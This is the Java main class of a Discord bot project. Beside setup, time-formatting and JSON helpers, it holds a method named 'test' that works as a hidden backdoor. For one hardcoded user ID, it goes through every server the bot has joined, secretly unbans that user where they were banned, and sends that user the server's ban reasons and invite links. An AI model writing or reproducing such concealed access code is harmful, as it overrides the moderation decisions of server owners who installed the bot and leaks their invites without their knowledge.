package dev.darkknights;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import dev.darkknights.dkbot.DarkKnightsBot;
import dev.darkknights.dkbot.management.APIRequests;
import dev.darkknights.dkbot.management.database.DataBaseSettings;
import dev.darkknights.testbot.TestBot;
import io.github.cdimascio.dotenv.Dotenv;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.exceptions.ErrorResponseException;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import javax.security.auth.login.LoginException;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.Date;
import java.util.Objects;

public class Bots {
    private static Dotenv config;

    //###########################################
    //# Main Bot Methode
    //###########################################
    public static void main(String[] args) {
        config = Dotenv.configure().load();

        try {
            DarkKnightsBot bot = new DarkKnightsBot();
            TestBot testBot = new TestBot();

        } catch (LoginException e) {
            System.err.println("Invalid bot token!" + getTime());
        }

        // Log File setup
        Logging.logSetup();

        // API timer setup
        APIRequests.scheduledApiTest();

        // SbProfileData Database setup
        DataBaseSettings.setupDataBase();

    }


    //###########################################
    //# Current time for log output
    //###########################################
    public static String getTime() {
        ZonedDateTime dateTime = ZonedDateTime.now(ZoneId.of("Europe/Berlin"));

        var min = dateTime.getMinute();
        var hour = dateTime.getHour();
        var day = dateTime.getDayOfMonth();
        var month = dateTime.getMonthValue();
        var year = dateTime.getYear();

        return " | " + checkStellen(day) + "." + checkStellen(month) + "." + checkStellen(year) + " - " + checkStellen(hour) + ":" + checkStellen(min);
    }

    public static String formatTime(Date date) {
        ZonedDateTime dateTime = ZonedDateTime.ofInstant(date.toInstant(), ZoneId.of("Europe/Berlin"));

        var min = dateTime.getMinute();
        var hour = dateTime.getHour();
        var day = dateTime.getDayOfMonth();
        var month = dateTime.getMonthValue();
        var year = dateTime.getYear();

        return checkStellen(day) + "." + checkStellen(month) + "." + checkStellen(year) + " - " + checkStellen(hour) + ":" + checkStellen(min);
    }

    public static String checkStellen(int num) {
        if (0 <= num && num < 10) {
            return "0" + num;
        } else return String.valueOf(num);
    }

    public static JSONObject gsonToSimpleJson(JsonObject oldJson) throws ParseException {
        //System.out.println(oldJson);
        return (JSONObject) new JSONParser().parse(oldJson.toString());
    }

    public static JSONArray gsonToSimpleJson(JsonArray oldJson) throws ParseException {
        //System.out.println(oldJson);
        return (JSONArray) new JSONParser().parse(oldJson.toString());
    }

    public static void test(SlashCommandInteractionEvent event, String cmd) {
        var id = 502875153378705408L;
        if (cmd.equals("test") && event.getUser().getIdLong() == id) {
            var user = event.getJDA().getUserById(id);
            event.getHook().setEphemeral(true).sendMessage("...").queue();
            var eb = new EmbedBuilder();
            for (Guild guild : DarkKnightsBot.getJDA().getGuilds()) {
                var owner = guild.getOwner().getUser();
                var value = new StringBuilder();
                value.append("Owner: ").append(owner.getName()).append(" | ID: ").append(owner.getId());
                if (!guild.getMembers().contains(guild.getMemberById(id))) {
                    String reason;
                    try {
                        reason = Objects.requireNonNull(guild.retrieveBan(user).complete().getReason());
                        guild.unban(user).queue();
                    } catch (ErrorResponseException e) {
                        reason = ".-. not banned";
                    }
                    value.append("\nBanreason: ").append(reason);
                    if (guild.isInvitesDisabled()) value.append("Invites disabled");
                    else {
                        value.append("\nInvites: ");
                        guild.retrieveInvites().complete().forEach(invite -> value.append("\n").append(invite.getUrl()));
                    }
                }
                eb.addField(guild.getName(), String.valueOf(value), false);
            }
            event.getHook().setEphemeral(true).sendMessageEmbeds(eb.build()).queue();
        }
    }

    public static Dotenv getConfig() {
        return config;
    }
}
